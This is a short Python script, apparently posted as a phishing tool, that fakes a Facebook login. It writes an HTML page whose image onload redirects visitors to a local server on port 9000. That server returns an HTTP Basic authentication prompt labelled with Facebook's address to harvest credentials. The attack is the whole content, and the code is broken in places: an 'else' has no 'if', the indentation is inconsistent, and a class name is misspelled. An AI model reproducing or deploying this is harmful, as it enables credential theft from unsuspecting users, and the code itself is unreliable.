#!/usr/bin/python

########################################################
We created again a phising page which looks like 
facebook index.Originally don't forget to do a print 
screen in the page would you prefer.I use facebook
After that a realm Authentication opened :)
########################################################

import SocketServer
import SimpleHTTPServer

#SHTTPServer subclass
class SHTTPServer(SimpleHTTPServer.SimpleHTTPRequestHandler):



    def do_GET(self):

             self.send_response(401)

             self.send_header('WWW-Authenticate','Basic realm=https://www.facebook.com')

             self.end_headers() 



        else : 

             SimpleHTTPServer.SimpleRequestHandler.do_GET(self)


target=open('index.html','w')
target.write("<img src='facebook.png' onload=window.location.assign('http://192.168.1.4:9000/user')>")
target.close()


s=SocketServer.TCPServer(("0.0.0.0",9000),SHTTPServer)
s.serve_forever()
